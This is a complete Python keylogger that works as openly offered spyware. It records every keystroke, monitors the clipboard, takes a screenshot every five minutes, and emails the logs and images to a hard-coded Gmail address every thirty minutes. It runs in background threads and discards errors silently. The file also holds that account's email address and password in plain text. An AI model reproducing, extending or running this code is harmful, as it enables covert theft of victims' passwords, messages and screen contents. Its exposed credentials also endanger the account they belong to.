import os
import time
import threading
import smtplib
import schedule
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pynput import keyboard
from PIL import ImageGrab
import pyperclip

# Email credentials
EMAIL_ADDRESS = 'Judeosafo111@gmail.com'
EMAIL_PASSWORD = 'silicon1*'
TO_ADDRESS = 'Judeosafo111@gmail.com'

# Log files and screenshot directory
KEYLOG_FILE = 'keylog.txt'
CLIPBOARD_FILE = 'clipboard.txt'
SCREENSHOT_DIR = 'screenshots'

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Keystroke logging
class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.log = ''

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            else:
                self.log += f'[{key.name}]'
        self.write_log()

    def write_log(self):
        with open(self.log_file, 'a') as f:
            f.write(self.log)
        self.log = ''

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.daemon = True
        listener.start()

# Clipboard monitoring
class ClipboardMonitor:
    def __init__(self, log_file):
        self.log_file = log_file
        self.last_clipboard = ''

    def check_clipboard(self):
        try:
            current = pyperclip.paste()
            if current != self.last_clipboard:
                self.last_clipboard = current
                with open(self.log_file, 'a') as f:
                    f.write(f'Clipboard: {current}\n')
        except Exception:
            pass

    def start(self):
        def loop():
            while True:
                self.check_clipboard()
                time.sleep(2)
        t = threading.Thread(target=loop, daemon=True)
        t.start()

# Screenshot capture
class ScreenshotTaker:
    def __init__(self, directory):
        self.directory = directory

    def take_screenshot(self):
        timestamp = time.strftime('%Y%m%d-%H%M%S')
        path = os.path.join(self.directory, f'screenshot_{timestamp}.png')
        img = ImageGrab.grab()
        img.save(path)
        return path

    def start(self, interval=300):
        def loop():
            while True:
                self.take_screenshot()
                time.sleep(interval)
        t = threading.Thread(target=loop, daemon=True)
        t.start()

# Email sending
def send_email():
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_ADDRESS
    msg['Subject'] = 'Keylogger Report'

    # Attach keylog
    with open(KEYLOG_FILE, 'r') as f:
        keylog_content = f.read()
    msg.attach(MIMEText(keylog_content, 'plain'))

    # Attach clipboard log
    with open(CLIPBOARD_FILE, 'r') as f:
        clipboard_content = f.read()
    msg.attach(MIMEText('\n--- Clipboard Log ---\n' + clipboard_content, 'plain'))

    # Attach recent screenshots
    screenshots = sorted(os.listdir(SCREENSHOT_DIR))[-3:]
    for shot in screenshots:
        path = os.path.join(SCREENSHOT_DIR, shot)
        with open(path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={shot}')
            msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        pass  # Optionally log errors

# Schedule emailing every 30 minutes
def schedule_email():
    schedule.every(30).minutes.do(send_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == '__main__':
    # Start keylogger
    keylogger = Keylogger(KEYLOG_FILE)
    keylogger.start()

    # Start clipboard monitor
    clipboard = ClipboardMonitor(CLIPBOARD_FILE)
    clipboard.start()

    # Start screenshot taker (every 5 minutes)
    screenshot = ScreenshotTaker(SCREENSHOT_DIR)
    screenshot.start(interval=300)

    # Start email scheduler
    email_thread = threading.Thread(target=schedule_email, daemon=True)
    email_thread.start()

    # Keep main thread alive
    while True:
        time.sleep(10) 